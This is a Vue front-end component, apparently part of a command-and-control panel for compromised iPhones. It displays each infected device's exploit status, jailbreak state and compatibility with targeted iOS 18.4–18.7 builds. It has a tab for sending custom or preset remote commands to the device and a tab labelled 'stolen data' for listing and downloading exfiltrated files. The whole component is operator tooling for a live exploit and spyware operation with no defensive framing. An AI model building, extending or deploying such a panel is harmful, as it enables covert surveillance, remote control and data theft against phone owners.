<template>
  <div class="device-detail">
    <el-button @click="$router.back()" style="margin-bottom: 20px;">返回</el-button>
    
    <el-alert
      title="系统兼容性说明"
      type="info"
      :closable="false"
      show-icon
      style="margin-bottom: 20px;"
    >
      <p><strong>支持的iOS版本：</strong>iOS 18.4 - iOS 18.7</p>
      <p><strong>支持的设备型号：</strong>iPhone 15系列、iPhone 16系列（搭载A17 Pro / A18芯片）</p>
    </el-alert>
    
    <el-card title="设备信息" v-if="device">
      <el-descriptions :column="2">
        <el-descriptions-item label="设备UUID">{{ device.device_uuid }}</el-descriptions-item>
        <el-descriptions-item label="IP地址">{{ device.ip }}</el-descriptions-item>
        <el-descriptions-item label="首次访问">{{ formatTime(device.first_seen) }}</el-descriptions-item>
        <el-descriptions-item label="最后访问">{{ formatTime(device.last_seen) }}</el-descriptions-item>
        <el-descriptions-item label="状态">
          <el-tag :type="getStatusTag(device.status)">{{ device.status === "active" ? "活跃" : "离线" }}</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="越狱状态">
          <el-tag :type="getJailbrokenTag(device.jailbroken)">{{ getJailbrokenText(device.jailbroken) }}</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="iOS版本">{{ device.os_version || "-" }}</el-descriptions-item>
        <el-descriptions-item label="兼容性">
          <el-tag :type="getCompatibilityTag(device)">{{ getCompatibilityText(device) }}</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="设备型号">{{ device.device_model || "-" }}</el-descriptions-item>
        <el-descriptions-item label="芯片型号">{{ device.chipset || "-" }}</el-descriptions-item>
        <el-descriptions-item label="漏洞状态">
          <el-tag :type="getExploitTag(device.exploit_status)">{{ getExploitText(device.exploit_status) }}</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="User Agent" :span="2">
          <span style="word-break: break-all;">{{ device.user_agent || "-" }}</span>
        </el-descriptions-item>
      </el-descriptions>
    </el-card>
    <el-tabs style="margin-top: 20px;">
      <el-tab-pane label="访问日志">
        <el-table :data="logs" border v-loading="logsLoading">
          <el-table-column prop="timestamp" label="时间" width="180" />
          <el-table-column prop="method" label="方法" width="80" />
          <el-table-column prop="path" label="路径" />
          <el-table-column prop="log_type" label="类型" width="100">
            <template #default="scope">
              <el-tag :type="getLogTypeTag(scope.row.log_type)">{{ getLogTypeText(scope.row.log_type) }}</el-tag>
            </template>
          </el-table-column>
        </el-table>
      </el-tab-pane>
      <el-tab-pane label="命令执行">
        <div style="margin-bottom: 15px;">
          <el-input v-model="newCommand" placeholder="输入自定义命令" style="width: 60%;" @keyup.enter="sendCommand" />
          <el-button type="primary" @click="sendCommand" :disabled="!newCommand">发送命令</el-button>
        </div>
        <el-row :gutter="20">
          <el-col :span="12" v-for="category in commandTemplates" :key="category.category">
            <el-card :title="category.category" shadow="hover">
              <div class="command-grid">
                <el-button 
                  v-for="cmd in category.commands" 
                  :key="cmd.command"
                  size="small"
                  @click="executePresetCommand(cmd)"
                  :title="cmd.description"
                  class="command-btn"
                >
                  {{ cmd.name }}
                </el-button>
              </div>
            </el-card>
          </el-col>
        </el-row>
        <el-table :data="commands" border v-loading="commandsLoading">
          <el-table-column prop="command" label="命令" />
          <el-table-column prop="status" label="状态" width="120">
            <template #default="scope">
              <el-tag :type="getCommandStatusTag(scope.row.status)">{{ getCommandStatusText(scope.row.status) }}</el-tag>
            </template>
          </el-table-column>
          <el-table-column prop="output" label="输出" show-overflow-tooltip>
            <template #default="scope">
              <el-button size="small" @click="showOutput(scope.row)">查看输出</el-button>
            </template>
          </el-table-column>
          <el-table-column prop="created_at" label="创建时间" width="180" />
          <el-table-column prop="executed_at" label="执行时间" width="180" />
          <el-table-column label="操作" width="120">
            <template #default="scope">
              <el-button size="small" @click="retryCommand(scope.row.id)" v-if="scope.row.status !== 'pending'">重试</el-button>
              <el-button size="small" type="danger" @click="deleteCommand(scope.row.id)">删除</el-button>
            </template>
          </el-table-column>
        </el-table>
      </el-tab-pane>
      <el-tab-pane label="窃取数据">
        <el-table :data="exfil" border v-loading="exfilLoading">
          <el-table-column prop="category" label="类别" width="120" />
          <el-table-column prop="path" label="原始路径" />
          <el-table-column prop="file_size" label="大小" width="100">
            <template #default="scope">{{ formatSize(scope.row.file_size) }}</template>
          </el-table-column>
          <el-table-column prop="uploaded_at" label="上传时间" width="180" />
          <el-table-column label="操作" width="150">
            <template #default="scope">
              <el-button size="small" @click="downloadExfil(scope.row.id)">下载</el-button>
              <el-button size="small" type="danger" @click="deleteExfil(scope.row.id)">删除</el-button>
            </template>
          </el-table-column>
        </el-table>
      </el-tab-pane>
    </el-tabs>
    <el-dialog title="命令输出" v-model="outputDialogVisible" width="60%">
      <pre style="white-space: pre-wrap; max-height: 400px; overflow-y: auto;">{{ currentOutput }}</pre>
    </el-dialog>
  </div>
</template>
<script setup>
import { ref, onMounted } from "vue"
import { useRoute } from "vue-router"
import { ElMessageBox, ElMessage } from "element-plus"
import axios from "../utils/axios"
import { commandTemplates } from "../data/commandTemplates"

const route = useRoute()
const device = ref(null)
const logs = ref([])
const exfil = ref([])
const commands = ref([])
const newCommand = ref("")
const outputDialogVisible = ref(false)
const currentOutput = ref("")

const logsLoading = ref(false)
const exfilLoading = ref(false)
const commandsLoading = ref(false)

function formatTime(time) {
  if (!time) return "-"
  return new Date(time).toLocaleString("zh-CN")
}

function formatSize(size) {
  if (!size) return "-"
  if (size < 1024) return size + " B"
  if (size < 1024 * 1024) return (size / 1024).toFixed(2) + " KB"
  return (size / 1024 / 1024).toFixed(2) + " MB"
}

function getStatusTag(status) { return status === "active" ? "success" : "info" }
function getJailbrokenTag(jailbroken) {
  if (jailbroken === "yes") return "danger"
  if (jailbroken === "no") return "success"
  return "info"
}
function getJailbrokenText(jailbroken) {
  if (jailbroken === "yes") return "已越狱"
  if (jailbroken === "no") return "未越狱"
  return "未知"
}
function getExploitTag(status) {
  if (status === "success") return "success"
  if (status === "failed") return "danger"
  return "warning"
}
function getExploitText(status) {
  if (status === "success") return "漏洞利用成功"
  if (status === "failed") return "漏洞利用失败"
  return "等待利用"
}
function getCompatibilityTag(device) {
  if (!device.os_version) return 'info'
  
  const supportedVersions = ['18.4', '18.5', '18.6', '18.7']
  if (supportedVersions.includes(device.os_version)) {
    return 'success'
  }
  
  const versionParts = device.os_version.split('.').map(Number)
  const major = versionParts[0] || 0
  const minor = versionParts[1] || 0
  
  if (major < 18 || (major === 18 && minor < 4)) {
    return 'danger'
  }
  
  return 'warning'
}
function getCompatibilityText(device) {
  if (!device.os_version) return '未知'
  
  const supportedVersions = ['18.4', '18.5', '18.6', '18.7']
  if (supportedVersions.includes(device.os_version)) {
    return '兼容'
  }
  
  const versionParts = device.os_version.split('.').map(Number)
  const major = versionParts[0] || 0
  const minor = versionParts[1] || 0
  
  if (major < 18 || (major === 18 && minor < 4)) {
    return '版本过低'
  }
  
  return '版本过高'
}
function getLogTypeTag(type) {
  const tags = { ios: "danger", exfil: "danger", request: "info", frontend: "warning", api: "success" }
  return tags[type] || "info"
}
function getLogTypeText(type) {
  const texts = { ios: "iOS设备", exfil: "数据窃取", request: "请求", frontend: "前端", api: "API" }
  return texts[type] || type
}
function getCommandStatusTag(status) {
  const tags = { pending: "warning", executing: "info", completed: "success", failed: "danger" }
  return tags[status] || "info"
}
function getCommandStatusText(status) {
  const texts = { pending: "等待执行", executing: "执行中", completed: "已完成", failed: "失败" }
  return texts[status] || status
}

async function loadDevice() {
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}`)
    device.value = response.data
  } catch (error) { console.error("加载设备信息失败:", error) }
}

async function loadDeviceLogs() {
  logsLoading.value = true
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}/logs`)
    logs.value = response.data
  } catch (error) { console.error("加载设备日志失败:", error) }
  finally { logsLoading.value = false }
}

async function loadDeviceExfil() {
  exfilLoading.value = true
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}/exfil`)
    exfil.value = response.data
  } catch (error) { console.error("加载设备数据失败:", error) }
  finally { exfilLoading.value = false }
}

async function loadDeviceCommands() {
  commandsLoading.value = true
  try {
    const response = await axios.get(`/api/commands?device_uuid=${route.params.uuid}`)
    commands.value = response.data
  } catch (error) { console.error("加载命令列表失败:", error) }
  finally { commandsLoading.value = false }
}

async function sendCommand() {
  if (!newCommand.value.trim()) return
  try {
    await axios.post(`/api/commands?device_uuid=${route.params.uuid}`, { command: newCommand.value })
    ElMessage.success("命令已发送")
    newCommand.value = ""
    loadDeviceCommands()
  } catch (error) {
    console.error("发送命令失败:", error)
    ElMessage.error("发送命令失败")
  }
}

async function executePresetCommand(cmd) {
  try {
    await axios.post(`/api/commands?device_uuid=${route.params.uuid}`, { command: cmd.command })
    ElMessage.success(`命令已发送: ${cmd.name}`)
    loadDeviceCommands()
  } catch (error) {
    console.error("发送命令失败:", error)
    ElMessage.error("发送命令失败")
  }
}

async function retryCommand(commandId) {
  try {
    await axios.post(`/api/commands/${commandId}/retry`)
    ElMessage.success("命令已重试")
    loadDeviceCommands()
  } catch (error) {
    console.error("重试命令失败:", error)
    ElMessage.error("重试命令失败")
  }
}

async function deleteCommand(commandId) {
  await ElMessageBox.confirm("确定要删除这条命令吗？", "提示", { type: "warning" })
  try {
    await axios.delete(`/api/commands/${commandId}`)
    ElMessage.success("删除成功")
    loadDeviceCommands()
  } catch (error) {
    console.error("删除命令失败:", error)
    ElMessage.error("删除失败")
  }
}

function showOutput(command) {
  currentOutput.value = command.output || "无输出"
  outputDialogVisible.value = true
}

async function downloadExfil(id) {
  try {
    const response = await axios.get(`/api/exfil/${id}/download`, { responseType: "blob" })
    const url = window.URL.createObjectURL(new Blob([response.data]))
    const link = document.createElement("a")
    link.href = url
    link.setAttribute("download", `exfil_${id}.bin`)
    document.body.appendChild(link)
    link.click()
    link.remove()
  } catch (error) {
    console.error("下载文件失败:", error)
    ElMessage.error("下载失败")
  }
}

async function deleteExfil(id) {
  await ElMessageBox.confirm("确定要删除这条窃取数据吗？", "提示", { type: "warning" })
  try {
    await axios.delete(`/api/exfil/${id}`)
    ElMessage.success("删除成功")
    loadDeviceExfil()
  } catch (error) {
    console.error("删除数据失败:", error)
    ElMessage.error("删除失败")
  }
}

onMounted(async () => {
  await loadDevice()
  await loadDeviceLogs()
  await loadDeviceExfil()
  await loadDeviceCommands()
})
</script>
<style scoped>
.command-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
}

.command-btn {
  margin: 0;
  white-space: nowrap;
}
</style>
